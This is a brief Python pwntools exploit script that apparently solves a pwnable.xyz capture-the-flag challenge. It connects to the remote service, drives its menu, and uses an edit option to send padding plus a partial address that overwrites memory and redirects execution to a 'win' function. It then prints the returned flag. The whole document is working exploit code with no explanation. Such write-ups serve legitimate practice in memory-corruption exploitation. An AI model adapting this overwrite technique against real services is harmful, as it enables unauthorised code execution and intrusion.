from pwn import *

#context.log_level = 'debug'

s = remote("svc.pwnable.xyz",30009)

s.recvuntil("Name: ")
s.send("A"*16)

def play(value):
	s.recvuntil("> ")
	s.sendline("1")
	s.recv(1024)
	s.sendline(str(value))

def save():
	s.recvuntil("> ")
	s.sendline("2")

def edit(content):
	s.recvuntil("> ")
	s.sendline("3")
	s.send(content)

win = 0x4009d6

play(1)
save()

pay = "A"*24 + "\xd6\x09\x40"

edit(pay)

s.recvuntil("> ")
s.sendline("1")

print s.recvuntil("}")
#s.interactive()
